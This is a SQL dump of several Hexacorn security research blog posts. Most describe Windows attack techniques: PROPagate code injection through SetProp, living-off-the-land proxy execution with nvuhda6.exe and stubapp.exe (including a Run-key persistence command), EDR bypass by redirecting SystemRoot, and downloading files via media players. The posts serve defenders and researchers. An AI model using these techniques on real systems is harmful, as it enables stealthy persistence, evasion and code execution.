is enumerating processes. This may add to the ‘badness’ weight, but on its own is not a malicious feature per se. Lots of ‘clean’ processes enumerate processes.\nWhat if we not only did that, but also intercepted Process32First and Process32Next?\nThis could be the result (output is simplified to demo the idea):\nCreateToolhelp32Snapshot\r\nProcess32First: [System Process]\r\nProcess32Next: System\r\nProcess32Next: smss.exe\r\nProcess32Next: csrss.exe\r\nProcess32Next: winlogon.exe\r\nProcess32Next: services.exe\r\nProcess32Next: lsass.exe\r\nProcess32Next: svchost.exe\r\nProcess32Next: svchost.exe\r\nProcess32Next: svchost.exe\r\nProcess32Next: svchost.exe\r\nProcess32Next: svchost.exe\r\nProcess32Next: spoolsv.exe\r\nProcess32Next: explorer.exe\r\nOpens Process: %WINDOWS%\\explorer.exe\r\nVirtualAllocEx: %WINDOWS%\\explorer.exe\r\nNtWriteVirtualMemory: %WINDOWS%\\explorer.exe\r\nVirtualAllocEx: %WINDOWS%\\explorer.exe\r\nNtWriteVirtualMemory: %WINDOWS%\\explorer.exe\r\nVirtualAllocEx: %WINDOWS%\\explorer.exe\r\nNtWriteVirtualMemory: %WINDOWS%\\explorer.exe\r\nVirtualAllocEx: %WINDOWS%\\explorer.exe\r\nNtWriteVirtualMemory: %WINDOWS%\\explorer.exe\r\nVirtualAllocEx: %WINDOWS%\\explorer.exe\r\nNtWriteVirtualMemory: %WINDOWS%\\explorer.exe\r\nCreateRemoteThread: %WINDOWS%\\explorer.exe\r\nNtResumeThread: %WINDOWS%\\explorer.exe\nAnalysing a log like this tells you straight away that the malware is enumerating processes, and when it finds explorer.exe, it injects a bunch of buffers into it (possibly mapping sections of the PE payload?), and then creates a remote thread. As a result, the explorer.exe process now is hosting malicious payload.\nWhile the code injection into explorer.exe can be deducted from manual dynamic analysis, or may be even obviously apparent when we are evaluating the process tree and network connections from a report generated by a sandbox, there is a subtle difference. The context these 2 additional intercepted APIs provide allows to be quite certain that the malware is actually quite specifically looking for the explorer.exe, and not for the other process.\nIt also tells us HOW the process is found.\nAnd mind you, this is actually not a trivial question if you are doing in-depth malware analysis.\nThere are cases where this determination is very important. Having an ability to quickly determine if we are missing some target process on the test system can save us a lot of time spent on mundane manual analysis. This is actually one of the first questions your customer will ask you, especially when it comes to targeted attacks. It is a very responsible job to deliver the results and not to miss stuff!\nWhen you look at malware that is highly targeted, f.ex. malware that is targeting Point of Sale systems, running it through a sandbox may _not_ give you any good results, because you either won’t see the process enumeration at all, or may miss the name of the process that the malware is looking for. The malware will look ‘broken’ to us. I can’t count how many times I wasted time on manual analysis and even incorrectly concluded that the malware is ‘broken’ while looking at heavily obfuscated, or bloatwarish malware samples. Until I started looking at the context of the early exit.\nIt is really helpful to be able to cheat a bit.\nFor the case of the process enumeration one can not only intercept the Process32First and Process32Next functions, but also enhance the results with the interception of string comparison functions.\nIf we get lucky, the result could look like this:\nProcess32First: [System Process]\r\nlstrcmpiA ([System Process], explorer.exe)\r\nProcess32Next: System\r\nlstrcmpiA (System, explorer.exe)\r\nProcess32Next: smss.exe\r\nlstrcmpiA (smss.exe, explorer.exe)\r\nProcess32Next: csrss.exe\r\nlstrcmpiA (csrss.exe, explorer.exe)\r\nProcess32Next: winlogon.exe\r\nlstrcmpiA (winlogon.exe, explorer.exe)\r\nProcess32Next: services.exe\r\nlstrcmpiA (services.exe, explorer.exe)\r\nProcess32Next: lsass.exe\r\nlstrcmpiA (lsass.exe, explorer.exe)\r\nProcess32Next: vmacthlp.exe\r\nlstrcmpiA (vmacthlp.exe, explorer.exe)\r\nProcess32Next: svchost.exe\r\nlstrcmpiA (svchost.exe, explorer.exe)\r\nProcess32Next: svchost.exe\r\nlstrcmpiA (svchost.exe, explorer.exe)\r\nProcess32Next: svchost.exe\r\nlstrcmpiA (svchost.exe, explorer.exe)\r\nProcess32Next: svchost.exe\r\nlstrcmpiA (svchost.exe, explorer.exe)\r\nProcess32Next: svchost.exe\r\nlstrcmpiA (svchost.exe, explorer.exe)\r\nProcess32Next: spoolsv.exe\r\nlstrcmpiA (spoolsv.exe, explorer.exe)\r\nProcess32Next: PERSFW.exe\r\nlstrcmpiA (PERSFW.exe, explorer.exe)\r\nProcess32Next: explorer.exe\r\nlstrcmpiA (explorer.exe, explorer.exe)\nThat makes the in-depth malware analysis supereasy, doesn’t?\nI think there is a potential market for supporting in-depth malware analysis with sandbox technology – make the interception configurable (offer a list of APIs to monitor, allow time to run to be selected manually, rebuild files, perhaps give live access to the analysis box, etc.).\nReversing ykS is the limit.\nAnd while I do commercial in-depth analysis and I may be shooting myself in a foot here, I can’t stress enough how important ROI is for both you and the customer.\nShare this :)', 'Reversing, Sandboxing', 'http://www.hexacorn.com/blog/2017/11/24/enter-sandbox-part-15-remnumneration-games/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (69, 'Permanent Link to Reusigned Binaries – Living off the signed land', 'Hexacorn', 'November 10, 2017 ', 'Lots of research that concentrates on living off the land techniques focuses on finding legitimate OS binaries (both EXE and DLLs) that allow to:\n\nload unsigned DLLs by the signed EXE files,\nload code in an unexpected, unconventional way using phantom DLLs, sideloaded DLLs,\nuse native OS tools and abuse their functionality to download and upload files, maintain persistence, convert data, etc.,\nbreak the process tree, and\nmany more.\n\nHere, I propose to take it to a possible next, or at least parallel level.\nIf you are familiar with the ROP gadgets you know that it relies on re-using pieces of code belonging to loaded libraries already present in memory. These are used to chain together code blocks that may execute code of attackers’ choice. By its sole nature ROP is a complex beast and while it can be, and is now fully automated, it most of the time relies on the fact that the final piece of code is just a regular payload that the ROP chain transfer the control to…\nI was wondering if it would be possible to re-use the ROP idea on a file-system level and build a library of high-level gadget-like signed executables and DLLs that could deliver the payload-like functionality, or at least its core building blocks. That would not only reduce the need to write the actual payload code – it would basically transfer the responsibility for the core functionality required by the attackers to signed libraries!\nIf it sounds weird, or complicated, let’s think for a second about existing installers. They implement and provide functionality that every single piece of malware needs: spawn processes, read file, write files, copying, downloading, uploading, same with the Registry operations, and more.\nThe installers have been abused by malware for a very long time, so it’s just a trivial example. I was thinking of something a little bit more refined and stealthy. Consider an example like this: a malicious document executes a macro; the macro drops a clean, signed executable produced by a well-known company – a file that not a single security solution can detect as malicious. It then instruments that signed executable to do all the dirty work. The chances are high that it would possibly bypass antivirus solutions, EDR, sandboxes and who knows, maybe even the Holy Grail – the whitelisting solutions.\nNow that I formulated the idea in my head it was time to do some legwork…\nI kicked off a number of searches within my files repository. After some poking around, eyeballing some code, a number of failed attempts I finally got lucky and hit the jackpot. To my surprise, I found a number of really interesting potentials!\nThe first interesting reusigned binary I came across is described below.\nThe nvuhda.exe and nvuhda6.exe are NVIDIA Uninstallers for 32- and 64-bit. When you execute them from a command line you will see the following screen:\nThe list of commands is shown below:\n\nAddUninstall, Call, CheckPath, CheckRAID, ClassSweep, Copy, CopyV, CreateDevice, CreateShortcut, Del, DelBoot, DelBootQuiet, DelIniIfMatched, DelOemInfs, DelReg, DelRegE, DirAndApply, Echo, EnumDevices, EnumRegCmd, EnumRegNamesCmd, Eval, FindOEMInf, GetDrivePort, GetFolderPath, GetInfGUID, GetReg, Help, If, InstallDriver, InstallDriverEx, KillApp, RemoveDevice, Run, RunOnce, SendMessage, Set, SetEnv, SetReg, Sleep, Splash, StartLogging, StopLogging, SysCallAndWait, System, UnifyUninst, Uninstall, UnInstallEx, UninstallGUI, UninstallService, WaitOnRegDel\n\nHmm some of them look really interesting.\nUsing the ‘Help’ command we can retrieve more information about the commands:\n\n \nWe can run a few tests:\n\n\nnvuhda6.exe System calc.exe\n\nspawns the Calculator\n\n\n\nnvuhda6.exe Copy test.txt,test-2.txt\n\ncopies ‘test.txt’ to ‘test-2.txt’\n\n\n\nnvuhda6.exe SetReg HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\malware=malware.exe\n\nadds a persistence key\n\n\n\nnvuhda6.exe CreateShortcut test.lnk,\"Test\",\"c:\\windows\\system32\\calc.exe\",\"\",\"c:\\windows\\system32\"\n\ncreates a shortcut file ‘test.lnk’ pointing to calculator\n\n\n\nnvuhda6.exe KillApp calculator.exe\n\nkills the instances of ‘calculator.exe’ process\n\n\nand so on and and so forth, and finally\n\nnvuhda6.exe Run foo\n\nwill run commands from the file ‘foo’ (where commands are from the list above; it’s basically an install script)\n\n\n\nIt’s pretty much a Swiss-Army tool for doing a lot of legitimate operations on the system, but it could be certainly abused. The only issue is the UAC, because the file required Admin privileges in its manifest.\nAnd… last, but not least – here’s the full list of commands:\n\nHelp\nCommand Name\nIf <Command Name> is provided displayes syntax and description of that command otherwise displays all the avilable commands\nSystem\nCommand\nExecutes the given system command (returns immidiately)\nSysCallAndWait\nExact path to App + arguments\ncall and wait untill app is done.\nSet\nName[=Value]\nDefines the variable if not defined and Sets the its value to the given value.\nCall\nSection Name\nruns all the commands in that section and returnd and continues executing commands after that line\nRun\nPath to an NVU File\nExecutes all the commands in that file and returns\nRunOnce\nPath to an NVU File\nRun all the commands in this file and delete the file\nDirAndApply\nDirPath,Command\nA dir will be applied to the given path and for each file found it sets variable {current file} to that file and calls the given command.\nIf\n[!]Exp1}[=%]{Exp2} then {Command}\nExecutes command if Exp1 is the same as Exp2 for = or Exp1 has Exp2 for % if ! is added to the beging of Exp1 it will negate the result\nEval\nCommand\nreEvaluates the given command and executes it\nStartLogging\nFilename\nOpens the given log files ad Logs all the commands in the given file\nStopLogging\nN/A\nStops logging close the file\nSleep\nmilisconds\nWaits for a number of miliseconds passed before executing the next command\nSplash\n{milisconds}, {BitmapPath}\nShows the given bitmap for the given time number on the screen\nWaitOnRegDel\n{Key,Value,LoopDelay,MaxLoopCount,TimeoutCommand}\nAllows waiting for a specific registry key or value to be deleted\nFindOEMInf\n{Variable} , INF name\nLooks under the windows INF directory for additional NVIDIA display driver infs (oem*.inf). Returns TRUE if found.\nCheckPath\n{Variable} = Local Path\nReturns TRUE if path exists.\nUninstall\n{NVU File}, {Uninstall Reg key}\nRuns the given file and deletes it. It also removes the given key from Add/Remove Program list\nUnInstallEx\nUninstall Display Reg key\nUninstalls the given product from add remove programs. If it detects uninstall as its nvu it uses internal uninstall command otherwise calls the appropriate uninstall command.\nAddUninstall\n{Uninstall File} , {Display Name}\nAdds Display name as the title to in Add/Remove programs list and copies uninstall binary and script file to windows system directory\nDelBoot\nPath to files to be deleted on reboot\nPut the given file for delete in the next reboot. If the file exists it will ask user for the reboot when program ends.\nDel\nPath to file to be deleted\nDeletes the given file if it exists, It also deletes a directory if it is empty. If the file is locked it will set the system to delete the file upon reboot\nDelBootQuiet\nPath to files to be deleted on reboot without reboot request\nPut the given file for delete in the next reboot. If the file exists it will ask user for the reboot when program ends.\nCopy\nSrcfile,DstFile\nCopies a file from the given source to given dest\nCopyV\nSrcfile,DstFile\nCopies a file from the given source to given dest only if source is a higher version.\nDelReg\nRegistry pattern matching string\nDeletes regkey(s) matching the given registry key\nDelRegE\nRegistry pattern matching string\nOnly deletes regkey(s) matching the given registry key if they have no subkeys or values\nSetReg\nRegistry pattern matching string\\ame[=value]\nFor all the matching registry paths, sets values if [=value] is present, creates subkeys otherwise\nGetReg\n{Variable} = {regkeypath\\name}\nIf it finds name under regkeypath copies its value to the given variable, othewise does nothing.\nUninstallService\nService Name\nuninstalls the given service name\nRemoveDevice\n{Enum Type} , {Hardware ID}, {Device type}\nRemove any device matched with the given description from the system using setupdi calls.\nEnum can be (PCI, EISA, etc), HWID usually is VEN_10DE and device type can be DISPLAY,HDC,MEDIA,NET,SYSTEM\nInstallDriverEx\n{Hardware ID}, {InfFullPath}\nInstalls the given driver for any device matched with the given device ID from the system using setupdi calls.\nInstallDriver\n{Hardware ID}, {InfFullPath}\nInstalls the given driver for any device matched using UpdateDriverForPlugAndPlayDevices for Win200 and above and InstallDriverEx for Win95 and Win98\nCreateDevice\n{Hardware ID}, {InfFullPath}\nThis function first creates a device Installs the driver for this device using given inf. This function should work for all versions of Windows\nGetInfGUID\nVariable Name = Full Path to Inf\nSets the given variable to a string representing the inf’s GUID\nDelOemInfs\n{WildCard} , {Section} , {Name} , {Value} , {[…]\nit searches in all inf files under sysdir\\\\inf\\\\[Wildcard and OEM*.inf] and if it finds a match with given parameters it deletes it on reboot\nDelIniIfMatched\nInffile} , {Section} , {Name} , {Value} , {[,…]\nit searches in all inf files under sysdir\\\\inf\\\\OEM*.inf and if it finds a match with given parameters it deletes it on reboot\nClassSweep\nGUID,{StrPattern1};{StrPattern2};….\nPass in the GUID of the inf and the string patterns of the reg names to be deleted. It will remove all the reg names corresponding to the str pattern under the GUID 0001….. except in Properties)\nEnumRegNamesCmd\nRegPathToEnumatrate} , {Command\nEnumerates all keys matching the given regpath and when matched enumarates all names under that key then calls the given command {Current Reg name} and {Current Reg value} are set when the given command is executed\nEnumRegCmd\n{RegPathToEnumatrate} , {Command}\nEnumerates all keys matching the given regpath and when matched calls the given command {Current Reg Key} is set then the given command is executed\nUnifyUninst\nN/A\nThis is a legacy command to maintain backward compatibility.\nSetEnv\nName=Value\nAdds the given name to environment variables and sets its value\nUninstallGUI\nWindowName\nDisplays the GUI to uninstall whatever user chooses\nKillApp\nAppName\nGiven an appname enumerates all the running app and kills its process if it is running\nSendMessage\n{AppName}, {Message}\nGiven an appname, sends its window a message\nCreateShortcut\nLnkFile,Title,ProgFile,ProgArgs,ProgWorkingDir\nCreates a shell link (shortcut)\nGetDrivePort\n{Variable} = {path}\nIt uses the first char of the path as drive letter and assigns the port number of that to the given variable name.\nEnumDevices\n{DeviceId},{Class},{Cmd}\nIt enumerats all the devices present on the system if any device has {DeviceID} and is from the given {Class} then variable {Current Device} is set to that device ID and the given command gets executed.\nGetFolderPath\nVariable Name = FolderCode\nSets the given variable to the path of a special folder, identified by its CSIDL (check MSDN SHGetSpecialFolderPath Function)\nCheckRAID\nN/A\nReturns TRUE if RAID exists.\n\nShare this :)', 'Anti-*, Anti-Forensics, Compromise Detection, Forensic Analysis, Incident Response, Living off the l', 'http://www.hexacorn.com/blog/2017/11/10/reusigned-binaries-living-off-the-signed-land/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (70, 'Permanent Link to DeXRAY 2.04 update', 'Hexacorn', 'November 9, 2017 ', 'I was contacted about a problem DeXRAY had decrypting new Quarantine files produced by MBAM so I ended up updating the decryption routine to handle this case as well. When you decrypt files produced by MBAM you should now get two sets of decrypted files – each decrypted using a different method.\nIf you are lucky, you should be able to recover the files for analysis \nYou can download the latest version here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA) – 2 versions\nMalwareBytes Quarantine files (QUAR) – 2 versions\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2017/11/09/dexray-2-04-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (71, 'Permanent Link to PROPagate follow-up – Some more Shattering Attack Potentials', 'Hexacorn', 'November 7, 2017 ', 'We now know that one can use SetProp to execute a shellcode inside 32- and 64-bit applications as long as they use windows that are subclassed.\nThere are more possibilities.\nWhile SetWindowLong/SetWindowLongPtr/SetClassLong/SetClassLongPtr are all protected and can be only used on windows belonging to the same process, the very old APIs SetWindowWord and SetClassWord … are not.\nAs usual, I tested it enumerating windows running a 32-bit application on a 64-bit system and setting properties to unpredictable values and observing what happens.\nIt turns out that again, pretty much all my Window applications crashed on Window 10. These 16 bits seem to be quite powerful…\nI am not a vulnerability researcher, but I bet we can still do something interesting; I will continue poking around. The easy wins I see are similar to SetProp e.g. GWL_USERDATA may point to some virtual tables/pointers; the DWL_USER – as per Microsoft – ‘sets new extra information that is private to the application, such as handles or pointers’. Assuming that we may only modify 16 bit of e.g. some offset, redirecting it to some code cave or overwriting unused part of memory within close proximity of the original offset could allow for a successful exploit.\n \nShare this :)', 'Anti-*, Code Injection, Malware Analysis, Random ideas', 'http://www.hexacorn.com/blog/2017/11/07/propagate-follow-up-some-more-shattering-attack-potentials/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (72, 'Permanent Link to Breaking download for breaking purposes', 'Hexacorn', 'November 6, 2017 ', 'This is a thought experiment only – it occurred to me that a number of available hacked sites that malware authors use for the purpose of payload delivery is making the the infection process not only easy and resilient. It also makes it easy to deliver a fragmented download mechanism that is similar to P2P technology and one that could potentially affect a number of security solutions.\nImagine having 2 or more hacked web sites – each of them hosting segments of the final deliverable e.g. it could be in a form of odd and even bytes, sectors, clusters, or the payload broken into pieces using some fancy, customized algorithm. The moment the malware loader (e.g. Office macro) is executed, it could download these pieces from various places and reassemble them on the host. Since they will be coming from different web sites, they will be different network streams associated with these downloads and as such every single security solution put in place will fail to detect an executable as a whole. This will therefore break the IDS, IPS, inline proxy, inline sandbox, the on-host EDR and AV, and whatever else is inspecting the network traffic, and in some cases – files.\nThere is also another angle to it; not having plain-vanilla .exe residing on hacked servers will make it harder to detect them – since they are just fragments of the final payload – no security solution will detect them as executables, hence they can escape .yara scans, etc. (file integrity monitors is a different story).\nObviously, one could simply encrypt the payload, or even encode it, but this is not the point here – many malicious samples still download pure vanilla .exes and they come from a single location.\nShare this :)', 'Random ideas', 'http://www.hexacorn.com/blog/2017/11/06/breaking-download-for-breaking-purposes/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (73, 'Permanent Link to PROPagate – a new code injection trick – 64-bit and 32-bit', 'Hexacorn', 'November 3, 2017 ', 'I have recently discovered a new trick that allows to execute code in other processes without using remote threads, APC, etc. While describing it, I focused only on 32-bit architecture. One may wonder whether there is a way for it to work on 64-bit systems and even more interestingly – whether there is a possibility to inject/run code between 32- and 64- bit processes.\nTo test it, I checked my 32-bit code injector on a 64-bit box. It crashed my 64-bit Explorer.exe process in no time.\nSo, yes, we can change properties of windows belonging to 64-bit processes from a 32-bit process! And yes, you can swap the subclass properties I described previously to point to your injected buffer and eventually make the payload execute! The reason it works is that original property addresses are stored in lower 32-bit of the 64-bit offset. Replacing that lower 32-bit part of the offset to point to a newly allocated buffer (also in lower area of the memory, thanks to VirtualAllocEx) is enough to trigger the code execution.\nSee below the GetProp inside explorer.exe retrieving the subclassed property:\n\nSo, there you have it… 32 process injecting into 64-bit process and executing the payload w/o heaven’s gate or using other undocumented tricks.\nThe below is the moment the 64-bit shellcode is executed:\n\np.s. the structure of the subclassed callbacks is slightly different inside 64-bit processes due to 64-bit offsets, but again, I don’t want to make it any easier to bad guys than it should be \n \nShare this :)', 'Anti-*, Code Injection, Compromise Detection, EDR, Incident Response, Malware Analysis', 'http://www.hexacorn.com/blog/2017/11/03/propagate-a-new-code-injection-trick-64-bit-and-32-bit/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (74, 'Permanent Link to Running programs via Proxy & jumping on a EDR-bypass trampoline, Part 4', 'Hexacorn', 'October 29, 2017 ', 'Here’s yet another subclass of tricks one can use to distort the process tree seen by EDR and sandbox solutions.\nMany Windows programs launch other internal Windows programs (native to OS). They do so carefully so they typically launch them from %SystemRoot%. Many of them use GetSystemDirectory to build a path, but there are still quite a few that rely on an environment variable – they need to use an ExpandEnvironmentStrings API to obtain the actual path.\nChanging that environmental variable and copying the required files to a redirected location while replacing the target application enables us to launch a payload of choice making it look like it was executed by a signed binary.\nExample:\nIn this old post I mentioned AtBroker. When you launch it from a command line without any arguments it will simply launch Narrator.exe.\nWe can:\n\ncreate a test folder\nchange the SystemRoot to point to it\ncopy all the necessary files from the original system32 and Registration folder (procmon helps)\nlaunch atbroker.exe\nthe narrator.exe payload will be executed\n\nThis launches C:\\Test\\System32\\Narrator.exe:\n\nShare this :)', 'Anti-Forensics, Compromise Detection, EDR, Forensic Analysis, Incident Response, Living off the land', 'http://www.hexacorn.com/blog/2017/10/29/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-4/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (75, 'Permanent Link to PROPagate – a new code injection trick', 'Hexacorn', 'October 26, 2017 ', 'Executing code inside a different process space is typically achieved via an injected DLL /system-wide hooks, sideloading, etc./, executing remote threads, APCs, intercepting and modifying the thread context of remote threads, etc. Then there is Gapz/Powerloader code injection (a.k.a. EWMI), AtomBombing, and mapping/unmapping trick with the NtClose patch.\nThere is one more.\nRemember Shatter attacks?\nI believe that Gapz trick was created as an attempt to bypass what has been mitigated by the User Interface Privilege Isolation (UIPI). Interestingly, there is actually more than one way to do it, and the trick that I am going to describe below is a much cleaner variant of it – it doesn’t even need any ROP.\nThere is a class of windows always present on the system that use window subclassing. Window subclassing is just a fancy name for hooking, because during the subclassing process an old window procedure is preserved while the new one is being assigned to the window. The new one then intercepts all the window messages, does whatever it has to do, and then calls the old one.\nThe ‘native’ window subclassing is done using the SetWindowSubclass API.\nWhen a window is subclassed it gains a new property stored inside its internal structures and with a name depending on a version of comctl32.dll:\n\nUxSubclassInfo – version 6.x\nCC32SubclassInfo – version 5.x\n\nLooking at properties of Windows Explorer child windows we can see that plenty of them use this particular subclassing property:\nSo do other Windows applications – pretty much any program that is leveraging standard windows controls can be of interest, including say… OllyDbg:When the SetWindowSubclass is called it is using SetProp API to set one of these two properties (UxSubclassInfo, or CC32SubclassInfo) to point to an area in memory where the old function pointer will be stored. When the new message routine is called, it will then call GetProp API for the given window and once its old procedure address is retrieved – it is executed.\nComing back for a moment to the aforementioned shattering attacks. We can’t use SetWindowLong or SetClassLong (or their newer SetWindowLongPtr and SetClassLongPtr alternatives) any longer to set the address of the window procedure for windows belonging to the other processes (via GWL_WNDPROC or GCL_WNDPROC). However, the SetProp function is not affected by this limitation. When it comes to the process at the lower of equal  integrity level the Microsoft documentation says:\nSetProp is subject to the restrictions of User Interface Privilege Isolation (UIPI). A process can only call this function on a window belonging to a process of lesser or equal integrity level. When UIPI blocks property changes, GetLastError will return 5.\nSo, if we talk about other user applications in the same session – there is plenty of them and we can modify their windows’ properties freely!\nI guess you know by now where it is heading:\n\nWe can freely modify the property of a window belonging to another process.\nWe also know some properties point to memory region that store an old address of a procedure of the subclassed window.\nThe routine that address points to will be at some stage executed.\n\nAll we need is a structure that UxSubclassInfo/CC32SubclassInfo properties are using. This is actually pretty easy – you can check what SetProp is doing for these subclassed windows. You will quickly realize that the old procedure is stored at the offset 0x14 from the beginning of that memory region (the structure is a bit more complex as it may contain a number of callbacks, but the first one is at 0x14).\nSo, injecting a small buffer into a target process, ensuring the expected structure is properly filled-in and and pointing to the payload and then changing the respective window property will ensure the payload is executed next time the message is received by the window (this can be enforced by sending a message).\nWhen I discovered it, I wrote a quick & dirty POC that enumerates all windows with the aforementioned properties (there is lots of them so pretty much every GUI application is affected). For each subclassing property found I changed it to a random value – as a result Windows Explorer, Total Commander, Process Hacker, Ollydbg, and a few more applications crashed immediately. That was a good sign. I then created a very small shellcode that shows a Message Box on a desktop window and tested it on Windows 10 (under normal account).\nThe moment when the shellcode is being called in a first random target (here, Total Commander):\nOf course, it also works in Windows Explorer, this is how it looks like when executed:\n\nIf we check with Process Explorer, we can see the window belongs to explorer.exe:Testing it on a good ol’ Windows XP and injecting the shellcode into Windows Explorer shows a nice cascade of executed shellcodes for each window exposing the subclassing property (in terms of special effects XP always beats Windows 10 – the latter freezes after first messagebox shows up; and in case you are wondering why it freezes – it’s because my shellcode is simple and once executed it is basically damaging the running application):\nFor obvious reasons I won’t be attaching the source code.\nIf you are an EDR or sandboxing vendor you should consider monitoring SetProp/SetWindowSubclass APIs as well as their NT alternatives and system services.\nAnd…\nThis is not the end. There are many other generic properties that can be potentially leveraged in a very same way:\n\nThe Microsoft Foundation Class Library (MFC) uses ‘AfxOldWndProc423’ property to subclass its windows\nControlOfs[HEX] – properties associated with Delphi applications reference in-memory Visual Component Library (VCL) objects\nNew windows framework e.g. Microsoft.Windows.WindowFactory.* needs more research\nA number of custom controls use ‘subclass’ and I bet they can be modified in a similar way\nSome properties expose COM/OLE Interfaces e.g. OleDropTargetInterface\n\nIf you are curious if it works between 32- and 64- bit processes… yes, it does!\nShare this :)', 'Anti-*, Code Injection, Compromise Detection, EDR, Incident Response, Malware Analysis, Reversing, S', 'http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (76, 'Permanent Link to Downloading off the land', 'Hexacorn', 'October 25, 2017 ', 'There are many documented ways to use legitimate applications to download stuff from the net.\nHere are two more:\n\nwmplayer.exe <URL>\nFlashPla.exe <URL>\n\nwhen executed they will download the file pointed by URLs, save them to the browser cache folder e.g. %USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE, and .. fail playing them as media.\nBut the files will remain on the system…\nThe first one is a pretty obvious one –  it’s just a Windows Media Player and it’s present natively on many systems.\nThe second one – FlashPla.exe – is your good ol’ Adobe Flash Player; you will find it all over the place as it’s being shipped with many drivers and tools accompanying various peripheral devices. It may not be called FlashPla (another name I came across is CL_Gallery.exe, FlashPlayer.exe, cs3flashplayer.exe,SAFlashPlayer.exe), but it’s pretty easy to find.\nExample locations:\n\nc:\\Program Files (x86)\\CyberLink\\Power2Go\\Gallery\\CL_Gallery.exe\nc:\\Program Files (x86)\\HP\\Digital Imaging\\help\\player\\FlashPla.exe\nC:\\Program Files\\HP\\Digital Imaging\\help\\player\\FlashPla.exe\nC:\\ProgramData\\LG\\LG LIP2230\\Help\\flash\\FlashPla.exe\nC:\\Program Files\\Macromedia\\Flash 5\\Players\\FlashPla.exe\nC:\\Program Files\\FlashJester\\Jugglor v30\\Projector Files\\CS3FlashPlayer.exe\n\nBoth players open windows and are pretty noisy (e.g. in Registry), but it’s always worth documenting the possibilities…\nShare this :)', 'Anti-*, Anti-Forensics, Compromise Detection, Incident Response, Living off the land', 'http://www.hexacorn.com/blog/2017/10/25/downloading-off-the-land/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (77, 'Permanent Link to Running programs via Proxy & jumping on a EDR-bypass trampoline, Part 3', 'Hexacorn', 'October 22, 2017 ', 'Apparently, there is a never-ending stream of genuine OS components and legitimate applications that are not only signed, but are also rich in features that can be used to disturb the process tree… and hide from EDR.\nHere’s another one: stubapp.exe\nIt is an application installed by HP drivers that can be typically found in these 2 locations:\n\nC:\\Program Files\\HP\\HPLJUT\\stubapp.exe\nc:\\Program Files (x86)\\HP\\HPLJUT\\stubapp.exe\n\nThe program comes with a sample stubapp.ini file that explains the .ini file syntax:\n;\r\n; StubApp ini file\r\n;\r\n; usage:\r\n; Stubapp -i <inifile> -m <section>\r\n;\r\n; [section]\r\n; 1=x\r\n; 2=y\r\n; [1.2k]\r\n; exename=notepad.exe\r\n; <section> contains a list with parts to run\r\n[...]\r\n; Application parameters\r\n; exename - location of application\r\n; command line parameters to be passed - exact syntax\r\n; waittofinish - 0=execute and continue; 1=wait for it to finish execution before continuing (CreateProcess must =1)\r\n; createprocess - user create process instead of shell execute; 1=yes, 0 or not specified = shellexecute (cannot waittofinish)\r\n; whentorun - 0=sw first only; 1=hw first only; 2=both hw and sw 1st; \r\n; 3=check the processes in [File_detect] & [regdetect] Sections (check for PNP)\nWith this info we can quickly craft a simple .ini file which we can use to e.g. launch Calculator:\n[Foo]\r\n1=Bar\r\n\r\n[Bar]\r\nexename=c:\\windows\\system32\\calc.exe\r\nparams=\"\"\r\nwaittofinish=0\r\nwhentorun=2\r\ncreateprocess=1\nWe launch it with the following command:\nstubapp.exe -i <fullpath to ini file>  -m Foo\nAs a side effect of executing the program we will observe a log file created in a temporary directory (%TEMP%\\stubapp.log) that amongst other things contains the following information:\n Application to launch: c:\\windows\\system32\\calc.exe\r\n Application parameters: \r\n Wait for application to finish: 0\r\n When to run application: 2\r\n If we should use CreateProcess: 1\r\n if we should check the registry: NOT FOUND\r\n SW 1st or HW 1st - Launching: c:\\windows\\system32\\calc.exe\r\n CreateProcess = 1, using CreateProcess\r\n Application to launch: \"c:\\windows\\system32\\calc.exe\" \r\n CStubApp::RunCreateProcess: Entering\r\n Process launched\nShare this :)', 'Anti-*, EDR, Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2017/10/22/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-3/\n');
